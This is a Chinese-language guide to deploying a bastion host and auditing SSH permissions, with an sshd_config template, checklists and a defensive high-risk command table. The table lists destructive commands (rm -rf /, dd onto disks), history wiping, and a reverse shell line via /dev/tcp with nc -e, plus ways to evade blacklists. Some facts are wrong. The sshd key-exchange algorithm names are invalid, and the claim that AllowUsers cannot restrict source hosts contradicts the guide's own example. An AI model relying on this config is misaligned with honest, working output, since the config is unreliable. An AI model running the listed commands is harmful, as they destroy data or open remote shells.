# 堡垒机部署与权限审计核查（bastion-host-deploy）

堡垒机解决的核心问题是：**让运维的所有操作都经过一个可审计的入口**。做不到这一点的「堡垒机」只是个带审计日志的跳板机，形同虚设。

这个技能做三件事：**选部署形态** → **定账号权限模型** → **核审计与拦截是否真的落地**。

---

## 硬边界（先看这条）

| 能做 | 不能做 |
|---|---|
| 给出部署形态选型与验收清单 | ❌ 代替你执行部署与网络改造 |
| 核查账号权限模型是否合理 | ❌ 代替安全部门做合规认定 |
| 给出高危命令清单与防护手段 | ❌ 提供绕过堡垒机审计的做法 |
| 给出日志留存期限参照 | ❌ 编造具体法规条款号与标准号 |
| 梳理 VPN / 堡垒机 / 零信任职责边界 | ❌ 代替架构师做整体安全体系设计 |

**出现以下情况，必须停下来人工处理：**

- 生产服务器仍存在**绕过堡垒机的直连通道**（内网可达 + SSH 未关）→ 这是部署失败，不是待优化项，必须立即封堵
- 存在**共享账号**（多人共用 root 或同一个运维账号）→ 无法追责，等于审计失效
- 日志只有登录记录、没有**会话操作记录** → 无法还原「做了什么」，不满足审计要求
- 录像存储**未做防篡改**（普通共享存储、可被管理员直接删）→ 审计证据不成立
- 需要申请「紧急通道绕过审计」→ 必须走审批并留痕，且事后补审
- 涉及**金融、政务、医疗**等强监管场景 → 留存期限与审计要求以现行规定和当地主管部门要求为准

## 三、部署形态选型

| 形态 | 原理 | 适用规模 | 优点 | 局限 |
|---|---|---|---|---|
| **旁路模式** | 运维先登录堡垒机，再从堡垒机连目标 | 中小规模（< 数百台） | 部署简单，不改网络结构 | **目标侧仍可被直连**，需配合封堵 |
| **网关模式（网络转发）** | 流量强制经堡垒机转发 | 中大规模 | 目标侧可关闭直连端口，**强制走审计** | 需改网络架构，故障影响面大 |
| **代理模式（协议代理）** | 堡垒机代理 SSH/RDP 等协议 | 需要支持多协议 | 支持 RDP、数据库等 | 非 SSH 协议需逐一适配 |
| **云厂商原生方案** | 云控制台 + 云审计 | 全部在云上 | 与云 IAM 打通 | 跨云/混合云场景割裂 |

**关键结论（必须写进方案）：**

1. **旁路模式的安全前提是「目标侧封堵直连」**。只上旁路、不封直连，等于没上——任何人从内网任何一台机器都能直连，堡垒机只是「多了一个可选入口」。
2. **强制走审计必须依赖网络层封堵**。密码分发、密钥分发、目标侧防火墙规则，三者至少做到一个。
3. **云上优先考虑云原生审计**（控制台操作审计 + 云Trail 类日志），自建堡垒机在云上往往是重复建设。

## 四、账号权限模型：最小化的四个维度

### 4.1 个人账号（第一原则）

| 反模式 | 后果 | 正确做法 |
|---|---|---|
| 多人共用 root | 无法追责，审计形同虚设 | **一人一账号**，堡垒机侧禁止共享账号登录 |
| 共享运维账号（ops） | 同上 | 拆分为个人账号，用角色聚合权限 |
| root 直接登录堡垒机 | root 的 home 下 `.ssh` 权限混乱，密钥管理失控 | 堡垒机登录用普通账号 + `sudo`，或限制 root 仅交互式应急使用 |

**考核口径**：堡垒机账号数 ≥ 实际运维人数；共享账号数 = 0。

### 4.2 最小权限

| 维度 | 反模式 | 正确做法 |
|---|---|---|
| 资产范围 | 一个账号能连全部生产库 | 按业务/环境/集群分账号 |
| 命令范围 | 登录即可执行任意命令 | 按角色配置命令白名单（读多写少） |
| 时间范围 | 7×24 永久权限 | 高危系统用**临时授权 + 自动回收** |
| 数据范围 | 权限不区分库/表/行 | 数据库侧按库、表、行级别授权 |
| 提权范围 | 登录即可 sudo 到 root | sudo 命令白名单，禁止 `sudo su -` / `sudo -i` |

**权限矩阵参考（生产数据库运维为例）：**

| 角色 | 读 DML | 写 DML | DDL | 授权 GRANT | 系统命令 | sudo root |
|---|---|---|---|---|---|---|
| 只读监控 | ✅ | ❌ | ❌ | ❌ | 查询类 | ❌ |
| 应用运维 | ✅ | ✅ | ❌ | ❌ | 应用启停、日志 | ❌ |
| DBA | ✅ | ✅ | ✅ | ✅ | 全量 | ✅（需审批 + 录屏标记） |
| 值班应急 | ✅ | ✅（限） | ✅ | ❌ | 全量 | ✅（限时临时授权） |

### 4.3 职责分离

| 必须分离的职责 | 说明 |
|---|---|
| **权限授予 vs 权限使用** | 授权由安全/管理岗执行，运维只使用不自行授权 |
| **审计 vs 操作** | 审计日志的管理员不应是日常运维管理员 |
| **生产 vs 测试变更** | 测试环境的变更权限不应自动继承到生产 |
| **数据库应用账号 vs DBA 账号** | 应用连接账号与人工运维账号必须分开 |
| **备份执行 vs 备份删除** | 能删备份的人不应同时是唯一能恢复的人 |

> 「三权分立」（系统管理员 / 安全管理员 / 审计管理员分设）在**现行规定要求**的场景必须落实，具体设置以现场合规要求为准。

### 4.4 认证方式

| 方式 | 强度 | 要求 |
|---|---|---|
| 密码 | 低 | 必须配合复杂度、定期更换、禁止复用 |
| 密码 + 双因子 | 中高 | **推荐基线** |
| 密钥/证书 | 高 | 私钥需集中托管，禁止本地留存明文 |
| 证书 + 双因子 | 高 | 强监管场景常用 |

**硬要求**：堡垒机自身禁止共享密码与共享密钥；禁用 root 直登；所有登录必须可关联到自然人。

## 五、服务端 sshd_config 关键项

### 5.1 必须配置项

```bash
# /etc/ssh/sshd_config
Port 22
Protocol 2                        # 老版本才需要，新版 sshd 无此项

PermitRootLogin no                # 禁止 root 直登
PasswordAuthentication yes        # 若仅用密钥则 no；二者至少禁一项
PubkeyAuthentication yes
X11Forwarding no
MaxAuthTries 3                    # 降低暴力破解收益
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2

# 只允许堡垒机网段访问（关键：封堵直连）
AllowUsers deploy@10.0.10.* alice@10.0.10.*

# 加密算法（按 OpenSSH 版本调整）
KexAlgorithms sntr761rsa-sha512,sntr761rsa-sha384,sntr761rsa-sha256
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
```

### 5.2 常见错误配置写法

| # | 错误写法 | 后果 | 正确做法 |
|---|---|---|---|
| 1 | `PermitRootLogin yes` | root 可被暴力破解 | `no`（应急例外需单独审批与封 IP） |
| 2 | `PasswordAuthentication yes` + 弱密码策略 | 暴力破解风险 | 优先密钥，密码则强策略 |
| 3 | 配了密钥认证但没设 `PasswordAuthentication no` | 密钥被暴力破解后仍可密码登录 | 二选一必须收紧 |
| 4 | 只配 `PermitRootLogin no`，**没封非 root 直连** | 运维绕过堡垒机直连 | `AllowUsers` / 防火墙限制来源 IP |
| 5 | `AllowUsers` 写了但**没 reload** | 配置不生效 | `sshd -t` 通过后 reload |
| 6 | `MaxAuthTries 0`（不限） | 暴力破解可行 | 设 3–6 |
| 7 | `sshd_config.d/` 里有片段覆盖主文件 | 主文件改了不生效 | 确认 `Include` 顺序与片段内容 |
| 8 | 只在堡垒机上记录，**目标侧不留日志** | 目标机被横向登录无法发现 | 目标侧保留 `sshd` 日志并集中收集 |
| 9 | `AllowTcpForwarding yes` 未评估 | 可用 SSH 隧道绕过访问控制 | 按需关闭或限制 |
| 10 | 私钥 `authorized_keys` 权限 644 | 权限过松可被利用 | `.ssh` 700、`authorized_keys` 600 |

### 5.3 封堵直连的三种做法

```
做法 A  目标服务器防火墙：仅允许堡垒机 IP 访问 22 端口
做法 B  目标服务器 sshd：AllowUsers 限制来源（注意 AllowUsers 限制的是用户不是来源）
做法 C  网络层：目标服务器只挂堡垒机所在的受控网段，不接入办公网
```

> **关键**：`AllowUsers` 限制的是「哪些用户可登录」，**不是「从哪登录」**。限制来源必须用防火墙或网络分层。多数「上了堡垒机还能被直连」的根因就是误以为 `AllowUsers` 能限制来源。

## 六、会话审计与留存

### 6.1 必须审计的四类行为

| 类型 | 内容 | 缺失后果 |
|---|---|---|
| **登录登出** | 谁、什么时候、从哪、成功还是失败 | 无法确认访问主体 |
| **命令操作** | 执行的每一条命令及输出 | 无法还原操作过程 |
| **会话录像** | 终端/图形会话录像 | 无法还原界面操作与上下文 |
| **文件传输** | 上传下载的文件名、大小、方向 | 数据外泄无痕迹 |

### 6.2 留存期限参照

> **具体留存期限以现行规定、行业规范与本单位审计要求为准。** 下表是常见的实践参照区间，不是合规结论。

| 场景 | 登录日志 | 命令日志 | 会话录像 | 说明 |
|---|---|---|---|---|
| 一般企业 IT | ≥ 6 个月 | ≥ 6 个月 | ≥ 1–3 个月 | 按成本与风险权衡 |
| 金融/支付类 | ≥ 1 年 | ≥ 1 年 | ≥ 3–6 个月 | **以现行规定为准** |
| 政务/关基 | 按主管部门要求 | 按主管部门要求 | 按主管部门要求 | 不自行判断 |
| 生产数据库操作 | ≥ 1 年 | ≥ 1 年 | **建议全量留存** | 变更追溯需求强 |

**硬要求（不分场景）：**

1. **日志必须防篡改**：存放在运维人员无写权限的位置，定期做完整性校验
2. **必须集中收集**：本地日志会被删，集中化后才能取证
3. **必须有审计管理员**：日常运维不得自行查看/导出/删除审计日志（避免掩盖痕迹）
4. **必须有留存到期清理机制**：不清理会撑爆存储，最终导致新日志写不进去——**这是审计系统最常见的失效方式**

### 6.3 审计有效性自检

| 检查项 | 通过标准 |
|---|---|
| 能按人查会话吗 | 是 |
| 能按时间回放某次会话吗 | 是 |
| 命令日志含输出还是只有输入 | 含输出（只有输入可能漏掉管道后的实际执行） |
| 管理员能否删除他人日志 | 不能 |
| 日志存储位置运维是否有写权限 | 无 |
| 磁盘满会导致什么 | 新日志丢失或服务异常——需有容量告警与归档策略 |

## 七、高危命令清单与防护对照

> 堡垒机应通过**命令过滤 / 会话控制**实现拦截。仅靠文档规定「不许执行某命令」不构成技术管控。

### 7.1 高危命令清单

| 类别 | 命令 | 风险 | 防护手段 |
|---|---|---|---|
| 数据销毁 | `rm -rf /`、`rm -rf *` | 不可恢复 | 命令黑名单 + 危险参数识别 |
| 数据销毁 | `dd if=/dev/zero of=/dev/sda` | 磁盘覆写 | 黑名单 |
| 数据销毁 | `mkfs.*`、`fdisk`、`parted` | 分区破坏 | 黑名单 + sudo 白名单排除 |
| 数据篡改 | `truncate`、`> /path/表名` | 数据库被清空 | 黑名单 |
| 历史清除 | `history -c`、`rm ~/.bash_history`、`unset HISTFILE` | 销毁审计线索 | 堡垒机侧强制记录，不依赖目标侧 history |
| 权限变更 | `chmod 777`、`chown -R root` | 权限失控 | 白名单排除 chmod/chown，或限定参数 |
| 账号变更 | `useradd`、`usermod`、`passwd`、`visudo` | 留后门 | sudo 白名单不含账号管理 |
| 提权 | `sudo su -`、`sudo -i`、`sudo bash` | 绕过命令过滤 | **必须拦截**，否则整套过滤失效 |
| 后门 | `nc -e`、`bash -i >& /dev/tcp/x/x 0>&1` | 反向 shell | 出站连接审计 + 黑名单 |
| 关审计 | `systemctl stop auditd`、`setenforce 0` | 关闭审计 | 堡垒机侧记录（目标侧关了也拦不住，必须中心侧记录） |
| 网络 | `iptables -F`、`systemctl stop firewalld` | 关防火墙 | sudo 白名单排除 |
| 审计库 | `DELETE FROM audit_log`、`TRUNCATE audit_log` | 销毁审计 | 数据库侧权限隔离，审计表只读账号 + 独立写入 |

### 7.2 拦截层次（从弱到强）

| 层次 | 手段 | 能绕过吗 |
|---|---|---|
| 1 | 文档规定「不许执行」 | **完全能绕过**，不算管控 |
| 2 | 命令黑名单正则 | 能绕过（编码变形、别名、`eval`、脚本文件） |
| 3 | 命令白名单 | **较难绕过**，但灵活性差 |
| 4 | 目标侧 sudo 白名单 + 目标侧无 root | 需目标侧配合，最强 |
| 5 | 容器/沙箱 + 只读挂载 | 从环境上杜绝 |

**必须记住**：`sudo su -` 会进入新 shell，**所有命令过滤在此失效**。如果 sudo 白名单里包含 `su`、`bash`、`sh`、`zsh`，整套命令审计就形同虚设。这是堡垒机配置里最常见的致命漏洞。

## 八、VPN / 堡垒机 / 零信任的职责边界

三者**不是替代关系**，职责完全不同：

| 维度 | VPN | 堡垒机 | 零信任 |
|---|---|---|---|
| **解决什么** | 从外部网络**接入**内网 | 对运维操作做**审计与管控** | 按身份与设备状态**逐次授权**访问 |
| **控制粒度** | 网络可达性（粗） | 会话与命令（细） | 单个资源单次访问（最细） |
| **是否留审计** | 通常只有登录日志 | **完整会话审计**（核心能力） | 有，但偏访问决策 |
| **能否替代** | 不能替代堡垒机 | 不能替代 VPN 的接入能力 | 理念上可覆盖部分场景，但落地仍需审计手段 |
| **典型误用** | 用 VPN 当审计手段 | 用堡垒机当唯一网络接入 | 用零信任概念包装但没落地策略 |

**常见架构组合（供选型参考）：**

```
远程办公  →  零信任网关 / VPN（接入 + 身份核验 + 设备状态）
运维访问  →  堡垒机（会话审计 + 命令管控）
资源访问  →  由零信任策略在会话内做细粒度授权
```

**必须说清的一句话**：**VPN 通了不代表访问有审计；堡垒机上了不代表网络就受控。** 前者解决接入，后者解决审计，两者都要。

## 九、部署验收清单

### 9.1 网络与接入

- [ ] 目标服务器的 22 端口**只对堡垒机网段开放**
- [ ] 从非堡垒机网段 `telnet <目标> 22` **必须失败**
- [ ] 直连路径已在防火墙/网络层封堵（不只是 `AllowUsers`）
- [ ] 堡垒机自身不对公网直接暴露（访问需经 VPN 或零信任网关）

### 9.2 账号与权限

- [ ] 堡垒机账号数 ≥ 运维人数，**共享账号为 0**
- [ ] root 直登已禁用（`PermitRootLogin no`）
- [ ] 每人权限按角色分配，可导出权限矩阵
- [ ] 高危系统的临时权限有**自动回收**机制
- [ ] sudo 白名单**不含** `su`、`bash`、`sh`、`-i`
- [ ] 密码或密钥策略已明确（禁用项已落到配置）

### 9.3 审计能力

- [ ] 登录成功与**失败**都有记录
- [ ] 命令日志**含输出**，不只是输入
- [ ] 会话录像可按人、按时间检索与回放
- [ ] 文件传输有记录（文件名、大小、方向）
- [ ] 审计存储位置运维**无写权限**
- [ ] 管理员**不能**删除他人日志
- [ ] 日志已集中收集到独立系统
- [ ] 存储有容量告警与归档策略（防日志写不进去）
- [ ] 留存期限已按要求配置并有到期清理机制

### 9.4 高危管控

- [ ] 高危命令清单已配置并**实测拦截成功**（不是只看配置界面）
- [ ] 已验证绕过手法（别名、`eval`、脚本文件、`sudo su`）均被拦截
- [ ] 应急绕过通道有审批流程且留痕
- [ ] 目标侧审计（`auditd` 等）独立于堡垒机，堡垒机被绕过仍能留痕

## 十、人工确认清单（这步不能省）

- [ ] 「运维能否直连服务器」的答案是**明确的不能**，而不是「理论上不能」
- [ ] 是否有人共用账号、共用密钥（必须为 0）
- [ ] 高危命令拦截是**实测过的**，不是看配置页面的
- [ ] `sudo su -` 这类提权路径是否已封（这一条不封，命令审计等于没有）
- [ ] 审计日志的删除权限在谁手上
- [ ] 日志留存期限的**要求来源**是谁（法规 / 行业规范 / 单位内部制度）
- [ ] 应急通道是否有人私自开通过
- [ ] 审计系统自身宕机时，运维访问是否会被阻断（**fail-close 还是 fail-open**）

> 最后一条尤其重要：很多堡垒机默认在自身故障时放行，这等于给了一个现成的绕过通道。生产环境应配置为 fail-close。

## 十一、脚本用法

```bash
python scripts/bastion_audit_check.py --file sshd_config.txt --profile prod-db
```

| 参数 | 说明 |
|---|---|
| `--file` | `sshd_config` 文本（含 `sshd_config.d/*.conf` 片段） |
| `--profile` | `prod-db` / `prod-web` / `dev` / `batch`，决定必检项严格度 |
| `--shared-accounts` | 逗号分隔的疑似共享账号名，用于核「是否仍被共用」 |
| `--json` / `--out` | JSON 输出 / 写入指定报告文件 |
| `--selftest` | 跑内置自检（≥ 8 条断言） |

脚本做五件事：① 按 `sshd_config` 关键项给出合规判定；② 识别「误以为 `AllowUsers` 能限制来源」这类典型误解并提示需防火墙配合；③ 检查 `sudo` 白名单里是否含 `su`/`bash`/`-i` 等提权逃逸路径；④ 输出高危命令清单与对应的防护层次建议；⑤ 输出验收清单与必须人工确认的项。

> 脚本读的是**配置文件文本**，不是运行中的堡垒机。它能告诉你配置有没有写错，但**不能**告诉你堡垒机是否真的在拦截、审计是否真的在录像——那两件事必须实测。

## 十二、最常见的坑

**坑一：上了旁路堡垒机，但没封堵目标侧直连。**
运维完全可以从办公网直连生产服务器，堡垒机只是「多了一个可选入口」。**旁路模式的安全前提是目标侧封堵**，这一点没做，前面所有配置都白费。

**坑二：以为 `AllowUsers` 能限制来源 IP。**
`AllowUsers` 限制的是「**哪些用户**可以登录」，不是「**从哪**登录」。限制来源必须靠防火墙规则或网络分层。这是最普遍的误解，直接导致直连通道没被堵上。

**坑三：sudo 白名单里放了 `su` 或 `bash`。**
`sudo su -` 会进入一个全新的 shell，**命令过滤在这一步之后完全失效**。后面配的所有命令黑名单、录像、审计都成了摆设。必须拦截所有能开启交互式 shell 的提权路径。

**坑四：以为「命令黑名单配了」等于「拦住了」。**
黑名单能被别名、`eval`、临时脚本、`base64` 解码后执行等方式绕过。必须实测，并且优先用**白名单**而不是黑名单。

**坑五：审计只有登录日志，没有会话与命令记录。**
能证明「谁登录过」，但证明不了「做了什么」。发生数据被删时，无法追责。这不满足审计要求。

**坑六：共享账号。**
运维习惯用共享的 `ops` 账号，图的是省事。代价是审计日志里所有操作都指向同一个账号，**等于没有审计**。个人账号不是体验问题，是合规底线。

**坑七：审计日志存在运维有写权限的地方。**
运维需要删日志时随手就删了。所有整改前都应先看日志是否存在——**如果日志能被删，它就不是证据**。

**坑八：日志留存到期不清理，最终撑爆存储。**
这是审计系统最常见的**技术性失效方式**：存储满了，新日志写不进去，而监控告警没人看，于是「有审计系统但没日志」。必须有容量告警与归档策略。

**坑九：堡垒机故障时默认放行。**
堡垒机挂了，运维直接连生产——这等于给了一个现成的绕过通道。生产环境应配置为 fail-close：堡垒机不可用时拒绝访问，而不是放行。

**坑十：用 VPN 代替审计。**
VPN 只解决「能不能进内网」，不解决「进来之后做了什么」。这两个问题必须用两套机制分别解决。

**坑十一：应急绕过通道事后不补审。**
「紧急情况下先连上，事后再补记录」如果变成常态，审计体系就形同虚设。应急通道必须有审批、有时限、有事后复核。

**坑十二：只看堡垒机自身的审计，不看目标侧。**
堡垒机可能被绕过或被入侵。目标侧（`auditd`、`sudo` 日志、`lastlog`）是第二道防线，必须独立保留并集中收集。

- 日志留存期限表是**实践参照区间，不是合规结论**。具体期限**以现行规定、行业规范、当地主管部门要求与本单位审计要求为准**，不得据此对外承诺合规
- 三权分立、强监管场景的具体设置要求，**以现场合规要求为准**
- 本技能不提供任何绕过审计的方法，也不建议通过「紧急模式」长期规避管控
- 涉及权限变更、封堵端口、修改访问控制策略的动作，**必须经审批后由授权人员执行**，并保留变更记录
- 审计数据涉及人员操作记录，其收集、存储、查阅与使用须遵守现行规定与本单位的数据安全要求
